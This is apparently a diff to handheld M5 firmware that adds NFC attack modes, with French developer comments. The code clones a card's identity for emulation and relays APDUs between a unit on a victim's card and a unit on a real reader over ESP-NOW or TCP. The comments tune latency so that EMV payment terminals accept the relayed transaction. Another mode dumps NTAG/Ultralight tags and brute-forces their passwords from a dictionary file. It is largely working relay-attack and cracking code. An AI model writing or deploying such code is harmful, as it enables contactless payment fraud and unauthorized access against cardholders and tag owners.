+                                sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34); sp.printf("SAK %02X ATS %db", rly_sak, ats_use_len);
+                                sp.setCursor(4, 48); sp.printf("Field: %s", (tgt_irq & 0x80) ? "ON " : ((tgt_irq & 0x40) ? "off" : "-"));
+                                sp.setCursor(4, 62); sp.printf("Relayed:%d WTX:%d", relayed, wtx_sent);
+                                sp.setCursor(4, 76); sp.printf("Tel:%s RTT %lums", rly_tcp.connected() ? "OK" : "KO", g_last_rtt);
+                                sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12); sp.print("BACK=stop");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                            }
+                            M5.update(); cardUpdate();
+                            if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
+                            if (!rly_tcp.connected()) run = false;
+                        }
+                        nfc_emul_stop();
+                        rlog_flush_sd();
+                    }
+                    wifi_rx_run = false; delay(60);
+                }
+                rly_transport = 0; rly_tcp.stop(); server.stop();
+                WiFi.softAPdisconnect(true); WiFi.mode(WIFI_OFF);
+            } else if (conn == 0) {
+            // Sub-menu: pick role
+            const char* rl_items[] = {"Emul capture", "Relay: Reader (A)", "Relay: Emul (B)", "VirtCard (A) noHAT"};
+            const int rl_n = 4;
+            int rl_sel = 0; int role = -1; bool rl_draw = true;
+            while (role < 0) {
+                if (rl_draw) {
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("NFC Relay/Emul");
+                    for (int i = 0; i < rl_n; i++) {
+                        sp.setTextColor(i == rl_sel ? TFT_GREEN : TFT_WHITE, TFT_BLACK);
+                        sp.setCursor(10, 24 + i * 16); sp.print(i == rl_sel ? "> " : "  "); sp.print(rl_items[i]);
+                    }
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print(";/. ENT BACK");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+                    rl_draw = false;
+                }
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); role = -2; break; }
+                if (kp(';')) { rl_sel = (rl_sel + rl_n - 1) % rl_n; rl_draw = true; delay(150); }
+                if (kp('.')) { rl_sel = (rl_sel + 1) % rl_n; rl_draw = true; delay(150); }
+                if (kp(KEY_ENTER)) { role = rl_sel; keyRelease(); }
+                delay(10);
+            }
+
+            // ===== Role 0: standalone emulation capture (jalon 1) =====
+            if (role == 0) {
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emul capture");
+                sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                sp.setCursor(20, 55); sp.print("Place card to CLONE...");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                NfcCardInfo card = {}; bool cancelled = false;
+                while (!card.valid) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
+                    card = nfc_activate(); if (!card.valid) delay(150);
+                }
+                if (!cancelled) {
+                    nfc_emul_start(card.uid, card.uid_len, card.atqa, card.sak);
+                    uint8_t frame[64]; uint8_t tgt_irq = 0; int cap = 0; char last[3*24+1] = {0};
+                    bool run = true; uint32_t lastDraw = 0;
+                    while (run) {
+                        uint8_t irq = 0; int n = nfc_emul_poll(frame, sizeof(frame), 120, &irq); tgt_irq |= irq;
+                        if (n > 0) {
+                            cap++; int p = 0; for (int i = 0; i < n && i < 24; i++) p += snprintf(last+p, sizeof(last)-p, "%02X ", frame[i]);
+                            Serial.printf("[EMUL] RX(%d): %s\n", n, last);
+                            uint8_t pcb = frame[0];   // self-contained ISO-DEP tag: validates nfc_emul_tx (load-mod)
+                            if (pcb == 0xE0) { uint8_t a[64]; int al = nfc_build_emul_ats(a); { char ax[3*64+1]; int q=0; for(int i=0;i<al&&i<64;i++) q+=snprintf(ax+q,sizeof(ax)-q,"%02X ",a[i]); Serial.printf("[EMUL-RATS] ATS len=%d (rly=%d): %s\n", al, rly_ats_len, ax); } nfc_emul_tx(a, al); }            // RATS -> ATS
+                            else if ((pcb & 0xE2) == 0x02) { uint8_t o[8]; int oi = 0; o[oi++] = 0x02 | (pcb & 0x01) | (pcb & 0x08); if (pcb & 0x08) o[oi++] = frame[1]; o[oi++] = 0x90; o[oi++] = 0x00; nfc_emul_tx(o, oi); } // I-block -> SW 90 00
+                            else if (pcb == 0xC2) { uint8_t d = 0xC2; nfc_emul_tx(&d, 1); }                                     // S(DESELECT)
+                        }
+                        // Redraw throttlé (cf Relay Emul B) : un redraw par poll faisait rater la
+                        // trame post-ATS -> activation ISO-DEP avortée. On reste collé au polling.
+                        if (millis() - lastDraw > 200) {
+                            lastDraw = millis();
+                            sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Emul capture");
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("UID: ");
+                            for (int i = 0; i < card.uid_len; i++) sp.printf("%02X", card.uid[i]);
+                            sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34); sp.printf("ATQA %04X SAK %02X", card.atqa, card.sak);
+                            sp.setCursor(4, 48); sp.printf("Field: %s", (tgt_irq & 0x80) ? "ON " : ((tgt_irq & 0x40) ? "off" : "-"));
+                            sp.setCursor(4, 62); sp.printf("Frames: %d", cap);
+                            sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 80); sp.print("Last:");
+                            sp.setCursor(4, 92); sp.print(last[0] ? last : "(waiting reader)");
+                            sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                        }
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
+                    }
+                    nfc_emul_stop();
+                }
+            }
+
+            // ===== Role 1: Relay Reader unit A (sits on the real card) =====
+            else if (role == 1) {
+                sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Reader (A)");
+                sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(20, 55); sp.print("Place card on reader...");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                // ensure reader field mode
+                nfc_cmd(NFC_CMD_STOP_ALL); nfc_wr(NFC_MODE_DEF, 0x09); nfc_wr(NFC_BIT_RATE, 0x00);
+                nfc_cmd(NFC_CMD_RESET_GAIN); nfc_cmd(NFC_CMD_CLEAR_FIFO);
+                nfc_wr(NFC_OP_CTRL, 0x80|0x40|0x08); delay(5); nfc_cmd(NFC_CMD_FIELD_ON); delay(20);
+                NfcCardInfo card = {}; bool cancelled = false;
+                while (!card.valid) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
+                    card = nfc_activate(); if (!card.valid) delay(150);
+                }
+                if (!cancelled) {
+                    // Get ATS for ISO-DEP cards (RATS)
+                    uint8_t ats[64]; int ats_len = 0;
+                    if (card.sak & 0x20) {
+                        int rl; uint8_t rats[2] = {0xE0, 0x80};   // FSDI=8 -> FSD=256 : evite le chainage carte->A (le FCI EMV tient en 1 frame) qui bouclait en duplication
+                        uint8_t* r = nfc_transceive(rats, 2, &rl, 200);
+                        // Le FIFO du ST25R3916 garde le CRC (2 octets) -> le retirer, sinon l'ATS
+                        // relaye a B est 2 octets trop long (TL ne matche pas) -> lecteur EMV rejette -> HLTA.
+                        if (r && rl > 2 && rl <= 66) { memcpy(ats, r, rl - 2); ats_len = rl - 2; }
+                    }
+                    nfc_i_block_num = 0;   // fresh ISO-DEP block numbering for this relay session (A<->card)
+                    if (!rly_begin()) {
+                        sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 110); sp.print("ESP-NOW init fail"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
+                    } else {
+                        // build IDENT payload
+                        uint8_t ident[80]; int ii = 0;
+                        ident[ii++] = card.uid_len; memcpy(ident+ii, card.uid, card.uid_len); ii += card.uid_len;
+                        ident[ii++] = card.atqa & 0xFF; ident[ii++] = (card.atqa >> 8) & 0xFF; ident[ii++] = card.sak;
+                        ident[ii++] = ats_len; memcpy(ident+ii, ats, ats_len); ii += ats_len;
+                        { char ux[3*10+1]; int q=0; for(int i=0;i<card.uid_len&&i<10;i++) q+=snprintf(ux+q,sizeof(ux)-q,"%02X ",card.uid[i]);
+                          char ax[3*64+1]; q=0; for(int i=0;i<ats_len&&i<64;i++) q+=snprintf(ax+q,sizeof(ax)-q,"%02X ",ats[i]);
+                          Serial.printf("[A-CARD] UID(%d) %s ATQA=%04X SAK=%02X ATS(%d) %s\n", card.uid_len, ux, card.atqa, card.sak, ats_len, ax); }
+                        unsigned long last_ident = 0; int served = 0; bool run = true; uint32_t lastDraw = 0;
+                        while (run) {
+                            // Renvoi IDENT seulement TANT QUE la transaction n'a pas commence (served==0) :
+                            // une fois B en emulation et les APDU qui circulent, rebroadcaster l'IDENT
+                            // (80o) polluerait le canal ESP-NOW et ajouterait de la latence par APDU.
+                            if (served == 0 && millis() - last_ident > 400) { rly_send(RLY_T_IDENT, 0, ident, ii); last_ident = millis(); }
+                            if (rly_req_ready) {
+                                uint8_t seq = rly_req_seq; int rq_len = rly_req_len; uint8_t rq[600];
+                                memcpy(rq, rly_req, rq_len); rly_req_ready = false;
+                                int rl; uint8_t* rr = nfc_transceive_apdu(rq, rq_len, &rl, 400);
+                                if (!rr || rl <= 0) {
+                                    // Carte muette -> souvent une NOUVELLE transaction (carte deselectionnee
+                                    // apres la precedente). On re-active la carte + re-RATS + reset block num,
+                                    // puis on reessaie l'APDU -> le relais reste actif pour plusieurs taps
+                                    // d'affilee sans re-setup.
+                                    NfcCardInfo c2 = nfc_activate();
+                                    if (c2.valid) {
+                                        if (c2.sak & 0x20) { int xl; uint8_t rt[2] = {0xE0, 0x80}; nfc_transceive(rt, 2, &xl, 200); }
+                                        nfc_i_block_num = 0;
+                                        rr = nfc_transceive_apdu(rq, rq_len, &rl, 400);
+                                    }
+                                }
+                                if (RLY_DEBUG) { char cx[3*24+1]; int q=0; for(int i=0;i<rq_len&&i<24;i++) q+=snprintf(cx+q,sizeof(cx)-q,"%02X ",rq[i]);
+                                  Serial.printf("[A-REQ] len=%d %s -> resp rl=%d %s\n", rq_len, cx, rl, (rr&&rl>0)?"OK":"NULL/6F00"); }
+                                if (rr && rl > 0) rly_send(RLY_T_RESP, seq, rr, rl);
+                                else { uint8_t sw[2] = {0x6F, 0x00}; rly_send(RLY_T_RESP, seq, sw, 2); }
+                                served++;
+                                lastDraw = 0;   // force un refresh apres un APDU (mais pas pendant l'attente)
+                            }
+                            // Redraw THROTTLÉ (~5x/s) : un fillScreen+pushSprite (~40ms) a chaque tour
+                            // ajoutait ~40ms de latence PAR APDU -> sur 15 APDU le terminal depassait
+                            // son budget de temps de transaction -> "abandon de debit". On reste collé
+                            // au relais, l'ecran se rafraichit juste assez.
+                            if (millis() - lastDraw > 200) { lastDraw = millis();
+                                sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Reader (A)");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 22); sp.print("Card UID: ");
+                                for (int i = 0; i < card.uid_len; i++) sp.printf("%02X", card.uid[i]);
+                                sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 38); sp.printf("SAK %02X  ATS %db", card.sak, ats_len);
+                                sp.setCursor(4, 54); sp.print("Tunnel: ESP-NOW ch1");
+                                sp.setCursor(4, 70); sp.printf("APDUs relayed: %d", served);
+                                sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                            }
+                            M5.update(); cardUpdate();
+                            if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
+                            delay(1);
+                        }
+                        rly_end();
+                    }
+                }
+            }
+
+            // ===== Role 2: Relay Emulator unit B (sits on the real reader) =====
+            else if (role == 2) {
+                if (!rly_begin()) {
+                    sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 55); sp.print("ESP-NOW init fail"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
+                } else {
+                    sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (B)");
+                    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(10, 55); sp.print("Waiting Reader unit A...");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+                    bool cancelled = false;
+                    while (!rly_ident_ready) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); cancelled = true; break; }
+                        delay(20);
+                    }
+                    if (!cancelled) {
+                        nfc_emul_start(rly_uid, rly_uid_len, rly_atqa, rly_sak);
+                        rlog_begin();
+                        uint8_t ats_use[64]; int ats_use_len = nfc_build_emul_ats(ats_use);
+                        { char ux[3*10+1]; int q=0; for(int i=0;i<rly_uid_len&&i<10;i++) q+=snprintf(ux+q,sizeof(ux)-q,"%02X ",rly_uid[i]);
+                          char ax[3*64+1]; q=0; for(int i=0;i<ats_use_len&&i<64;i++) q+=snprintf(ax+q,sizeof(ax)-q,"%02X ",ats_use[i]);
+                          Serial.printf("[B-EMUL-START] UID(%d) %s ATQA=%04X SAK=%02X | ATS(%d rly=%d) %s\n",
+                                        rly_uid_len, ux, rly_atqa, rly_sak, ats_use_len, rly_ats_len, ax); }
+                        uint8_t cur_uid[10]; uint8_t cur_ulen = rly_uid_len; memcpy(cur_uid, rly_uid, rly_uid_len);
+                        uint8_t frame[320]; uint8_t seq = 0; int relayed = 0, wtx_sent = 0; uint8_t tgt_irq = 0;
+                        char last[3*16+1] = {0}; bool run = true; uint32_t lastDraw = 0;
+                        while (run) {
+                            // re-arm if A switched to another card profile (identity changed)
+                            if (rly_ident_ready && (rly_uid_len != cur_ulen || memcmp(rly_uid, cur_uid, rly_uid_len) != 0)) {
+                                cur_ulen = rly_uid_len; memcpy(cur_uid, rly_uid, rly_uid_len);
+                                nfc_emul_start(rly_uid, rly_uid_len, rly_atqa, rly_sak);
+                                ats_use_len = nfc_build_emul_ats(ats_use);
+                                Serial.println("[EMUL] identity changed -> re-armed");
+                            }
+                            uint8_t irq = 0; int n = nfc_emul_poll(frame, sizeof(frame), 100, &irq); tgt_irq |= irq;
+                            if (n > 0) {
+                                uint8_t pcb = frame[0];
+                                int p = 0; for (int i = 0; i < n && i < 16; i++) p += snprintf(last+p, sizeof(last)-p, "%02X ", frame[i]);
+                                if (RLY_DEBUG) { char hx[3*32+1]; int q=0; for (int i=0;i<n && i<32;i++) q+=snprintf(hx+q,sizeof(hx)-q,"%02X ",frame[i]); Serial.printf("[B-RX] n=%d %s\n", n, hx); }
+                                if (pcb == 0xE0) {                        // RATS -> ATS
+                                    g_reader_fsd = fsd_from_fsdi(n >= 2 ? (frame[1] >> 4) : 8);
+                                    char ax[3*64+1]; int q=0; for (int i=0;i<ats_use_len && i<64;i++) q+=snprintf(ax+q,sizeof(ax)-q,"%02X ",ats_use[i]);
+                                    if (RLY_DEBUG) Serial.printf("[B-RATS] FSDI=%d fsd=%d -> ATS len=%d (rly_ats_len=%d): %s\n", (n>=2?frame[1]>>4:8), g_reader_fsd, ats_use_len, rly_ats_len, ax);
+                                    nfc_emul_tx(ats_use, ats_use_len);
+                                    if (RLY_DEBUG) Serial.println("[B-ATS] sent");
+                                } else if (pcb == 0xC2) {                 // S(DESELECT)
+                                    if (RLY_DEBUG) Serial.println("[B-RX] S(DESELECT) C2");
+                                    uint8_t d = 0xC2; nfc_emul_tx(&d, 1);
+                                    // fin de transaction -> RE-ARME la cible pour le tap suivant (reste actif)
+                                    seq = 0; nfc_emul_start(rly_uid, rly_uid_len, rly_atqa, rly_sak);
+                                } else if ((pcb & 0xE2) == 0x02) {        // I-block: reader-chaining + relay + response-chaining + latency
+                                    relay_service_iblock(frame, n, &seq, &relayed, &wtx_sent);
+                                }
+                                // R-blocks / chaining: TODO (v1 assumes single-frame commands)
+                            }
+                            // Redraw THROTTLÉ (max ~5x/s) : un fillScreen+pushSprite coûte des
+                            // dizaines de ms ; le faire à chaque tour faisait rater la trame que le
+                            // terminal envoie juste après l'ATS (SELECT PPSE) -> activation avortée,
+                            // relayed=0. On garde la boucle collée au polling pendant la transaction.
+                            if (millis() - lastDraw > 200) {
+                                lastDraw = millis();
+                                sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Relay Emul (B)");
+                                sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 20); sp.print("Emul UID: ");
+                                for (int i = 0; i < rly_uid_len; i++) sp.printf("%02X", rly_uid[i]);
+                                sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 34); sp.printf("SAK %02X ATS %db", rly_sak, ats_use_len);
+                                sp.setCursor(4, 48); sp.printf("Field: %s", (tgt_irq & 0x80) ? "ON " : ((tgt_irq & 0x40) ? "off" : "-"));
+                                sp.setCursor(4, 62); sp.printf("Relayed:%d WTX:%d", relayed, wtx_sent);
+                                sp.setCursor(4, 76); sp.printf("RTT %lu/%lums max", g_last_rtt, g_max_rtt);
+                                sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 92); sp.print("Last:");
+                                sp.setCursor(4, 104); sp.print(last[0] ? last : "(waiting reader)");
+                                sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                                if (use_sprite) sprite->pushSprite(0, 0);
+                            }
+                            M5.update(); cardUpdate();
+                            if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
+                        }
+                        nfc_emul_stop();
+                        rlog_flush_sd();
+                    }
+                    rly_end();
+                }
+            }
+            // ===== Role 3: Virtual card A (no NFC HAT) — jalon-3 ESP-NOW end-to-end validation =====
+            else if (role == 3) {
+                if (!rly_begin()) {
+                    sp.fillScreen(TFT_BLACK); sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(4, 55); sp.print("ESP-NOW init fail"); if (use_sprite) sprite->pushSprite(0,0); delay(1500);
+                } else {
+                    uint8_t ident[80]; int ii = 0;                          // synthetic ISO-DEP identity for unit B
+                    static const uint8_t vuid[7] = {0x04, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
+                    ident[ii++] = 7; memcpy(ident+ii, vuid, 7); ii += 7;
+                    ident[ii++] = 0x44; ident[ii++] = 0x03;                 // ATQA 0x0344 (7-byte, 4A)
+                    ident[ii++] = 0x20;                                     // SAK 0x20 (ISO-DEP)
+                    static const uint8_t vats[5] = {0x05, 0x78, 0x80, 0xE0, 0x00};
+                    ident[ii++] = 5; memcpy(ident+ii, vats, 5); ii += 5;
+                    unsigned long last_ident = 0; int served = 0; char lastreq[3*16+1] = {0}; bool run = true;
+                    while (run) {
+                        if (millis() - last_ident > 400) { rly_send(RLY_T_IDENT, 0, ident, ii); last_ident = millis(); }
+                        if (rly_req_ready) {
+                            uint8_t seq = rly_req_seq; int p = 0;
+                            for (int i = 0; i < rly_req_len && i < 16; i++) p += snprintf(lastreq+p, sizeof(lastreq)-p, "%02X ", rly_req[i]);
+                            rly_req_ready = false;
+                            uint8_t resp[4] = {0xCA, 0xFE, 0x90, 0x00};     // marker => proves the radio round-trip
+                            rly_send(RLY_T_RESP, seq, resp, 4); served++;
+                            Serial.printf("[VCARD] REQ seq=%d len=%d -> CAFE9000\n", seq, rly_req_len);
+                        }
+                        sp.fillScreen(TFT_BLACK); sp.fillRect(0, 0, W, 14, 0x0841);
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("VirtCard A (noHAT)");
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, 22); sp.print("Synthetic 4A card");
+                        sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 38); sp.print("UID 04112233445566");
+                        sp.setCursor(4, 52); sp.print("Reply: CA FE 90 00");
+                        sp.setCursor(4, 68); sp.printf("APDUs served: %d", served);
+                        sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, 84); sp.print("Last REQ:");
+                        sp.setCursor(4, 96); sp.print(lastreq[0] ? lastreq : "(waiting B)");
+                        sp.fillRect(0, H-14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=stop");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); run = false; }
+                        delay(2);
+                    }
+                    rly_end();
+                }
+            }
+            }   // fin else if (conn == 0) — chemin Dual
+        }
+
+        // ── Mode 8: Ultralight / NTAG (dump + counter + signature + pwd BF) ──
+        if (mode == 8) {
+            static uint8_t ul_pages[231 * 4];   // NTAG216 max
+            while (true) {
+                // Scanning screen
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 14, 0x0841);
+                sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("UL / NTAG");
+                sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                sp.setCursor(20, 55); sp.print("Place tag on reader...");
+                sp.fillRect(0, H-14, W, 14, 0x0841);
+                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+                if (use_sprite) sprite->pushSprite(0, 0);
+
+                NfcCardInfo card = {};
+                while (!card.valid) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); goto ul_done; }
+                    card = nfc_activate();
+                    if (!card.valid) delay(180);
+                }
+
+                // Identify via GET_VERSION (falls back to legacy Ultralight)
+                uint8_t ver[8]; int vlen = ul_get_version(ver);
+                UlType ut = (vlen >= 7) ? ul_identify(ver, vlen) : ul_identify_legacy();
+                if (ut.total > 231) ut.total = 231;
+
+                // Dump all pages (READ returns 4 pages / 16 bytes at a time)
+                memset(ul_pages, 0, sizeof(ul_pages));
+                int read_ok = 0, first_locked = -1;
+                for (int p = 0; p < ut.total; p += 4) {
+                    uint8_t buf[16];
+                    if (ul_read((uint8_t)p, buf)) {
+                        int n = ut.total - p; if (n > 4) n = 4;
+                        memcpy(&ul_pages[p * 4], buf, n * 4);
+                        read_ok += n;
+                    } else if (first_locked < 0) {
+                        first_locked = p;
+                    }
+                    delay(2);
+                }
+                // Re-activate (READ failures may have halted the tag) before extras
+                card = nfc_activate();
+                uint8_t cnt3[3]; int has_cnt = ut.has_version ? ul_read_cnt(0, cnt3) : 0;
+                if (!card.valid) card = nfc_activate();
+                uint8_t sig32[32]; int has_sig = ut.has_version ? ul_get_sig(sig32) : 0;
+
+                // Detail / navigation screen
+                int page_view = 0;                  // top page shown in hex list
+                bool need_draw = true;
+                bool refresh_hint = false;
+                while (true) {
+                    if (need_draw) {
+                        sp.fillScreen(TFT_BLACK);
+                        sp.fillRect(0, 0, W, 14, 0x0841);
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print(ut.name);
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                        sp.setCursor(2, 17); sp.print("UID:");
+                        for (int i = 0; i < card.uid_len && i < 7; i++) sp.printf(" %02X", card.uid[i]);
+                        sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                        sp.setCursor(2, 29);
+                        sp.printf("Pg %d/%d rd=%d", ut.total, ut.total, read_ok);
+                        if (has_cnt) sp.printf(" cnt=%02X%02X%02X", cnt3[2], cnt3[1], cnt3[0]);
+                        sp.setCursor(2, 41);
+                        sp.setTextColor(has_sig ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
+                        sp.printf("Sig:%s", has_sig ? "yes" : "no");
+                        sp.setTextColor(first_locked >= 0 ? TFT_ORANGE : TFT_DARKGREY, TFT_BLACK);
+                        if (first_locked >= 0) sp.printf("  locked@p%d", first_locked);
+                        else sp.print("  all readable");
+                        // hex page list (4 pages visible)
+                        sp.setTextFont(1); sp.setTextSize(1);
+                        int y = 54;
+                        for (int i = 0; i < 4 && (page_view + i) < ut.total; i++) {
+                            int pg = page_view + i;
+                            sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            sp.setCursor(2, y);
+                            sp.printf("p%02X:", pg);
+                            for (int j = 0; j < 4; j++) sp.printf(" %02X", ul_pages[pg * 4 + j]);
+                            y += 10;
+                        }
+                        sp.fillRect(0, H-14, W, 14, 0x0841);
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H-12);
+                        sp.print(refresh_hint ? "S=save P=pwd ;/.pg BACK" : "S=save P=pwd ;/.pg BACK");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        need_draw = false;
+                    }
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); goto ul_done; }
+                    if (kp('.')) { keyRelease(); if (page_view + 4 < ut.total) page_view += 4; need_draw = true; delay(120); }
+                    if (kp(';')) { keyRelease(); if (page_view - 4 >= 0) page_view -= 4; need_draw = true; delay(120); }
+
+                    // S = save dump to SD (/evil/nfc/ul_<uid>.txt)
+                    if (kp('s') || kp('S')) {
+                        keyRelease();
+                        SD.mkdir("/evil/nfc");
+                        char fn[72];
+                        snprintf(fn, sizeof(fn), "/evil/nfc/ul_%02X%02X%02X%02X.txt",
+                                 card.uid[0], card.uid[1], card.uid[2], card.uid[3]);
+                        File f = SD.open(fn, FILE_WRITE);
+                        bool ok = false;
+                        if (f) {
+                            f.print("UID:");
+                            for (int i = 0; i < card.uid_len; i++) f.printf(" %02X", card.uid[i]);
+                            f.println();
+                            f.printf("ATQA: %04X\n", card.atqa);
+                            f.printf("SAK: %02X\n", card.sak);
+                            f.printf("Type: %s\n", ut.name);
+                            f.printf("Pages: %d\n", ut.total);
+                            if (has_cnt) f.printf("Counter: %02X%02X%02X\n", cnt3[2], cnt3[1], cnt3[0]);
+                            if (has_sig) {
+                                f.print("Signature:");
+                                for (int i = 0; i < 32; i++) f.printf(" %02X", sig32[i]);
+                                f.println();
+                            }
+                            char line[80];
+                            for (int pg = 0; pg < ut.total; pg++) {
+                                int pos = snprintf(line, sizeof(line), "Page %d:", pg);
+                                for (int j = 0; j < 4; j++) pos += snprintf(line + pos, sizeof(line) - pos, " %02X", ul_pages[pg * 4 + j]);
+                                f.println(line);
+                            }
+                            f.close(); ok = true;
+                        }
+                        sp.fillRect(0, H-26, W, 12, TFT_BLACK);
+                        sp.setTextColor(ok ? TFT_GREEN : TFT_RED, TFT_BLACK);
+                        sp.setCursor(2, H-25); sp.print(ok ? fn : "SD save failed");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        delay(1200); need_draw = true;
+                    }
+
+                    // P = PWD_AUTH brute-force (dict + FFFFFFFF / 00000000)
+                    if ((kp('p') || kp('P')) && ut.has_pwd) {
+                        keyRelease();
+                        uint8_t found[4]; uint8_t pack[2]; bool hit = false; long tried = 0;
+                        // 1) built-in defaults
+                        uint8_t defs[2][4] = { {0xFF,0xFF,0xFF,0xFF}, {0x00,0x00,0x00,0x00} };
+                        for (int d = 0; d < 2 && !hit; d++) {
+                            nfc_activate();
+                            tried++;
+                            if (ul_pwd_auth(defs[d], pack)) { memcpy(found, defs[d], 4); hit = true; }
+                        }
+                        // 2) dictionary file
+                        File pf = hit ? File() : SD.open("/evil/nfc/ul_pwd.txt", FILE_READ);
+                        bool cancel = false;
+                        if (pf) {
+                            while (pf.available() && !hit && !cancel) {
+                                String ln = pf.readStringUntil('\n'); ln.trim();
+                                uint8_t pw[4];
+                                if (!ul_parse_pwd_line(ln.c_str(), pw)) continue;
+                                nfc_activate();
+                                tried++;
+                                if (ul_pwd_auth(pw, pack)) { memcpy(found, pw, 4); hit = true; break; }
+                                if ((tried & 0x0F) == 0) {
+                                    sp.fillRect(0, 41, W, 12, TFT_BLACK);
+                                    sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                                    sp.setCursor(2, 41); sp.printf("PWD BF... tried %ld", tried);
+                                    if (use_sprite) sprite->pushSprite(0, 0);
+                                    M5.update(); cardUpdate();
+                                    if (kp(KEY_BACKSPACE)) { keyRelease(); cancel = true; }
+                                }
+                            }
+                            pf.close();
+                        }
+                        sp.fillRect(0, 41, W, 12, TFT_BLACK);
+                        if (hit) {
+                            sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(2, 41);
+                            sp.printf("PWD %02X%02X%02X%02X PACK %02X%02X", found[0], found[1], found[2], found[3], pack[0], pack[1]);
+                        } else {
+                            sp.setTextColor(cancel ? TFT_ORANGE : TFT_RED, TFT_BLACK); sp.setCursor(2, 41);
+                            sp.printf(cancel ? "PWD BF cancelled (%ld)" : "PWD not found (%ld)", tried);
+                        }
+                        if (use_sprite) sprite->pushSprite(0, 0);
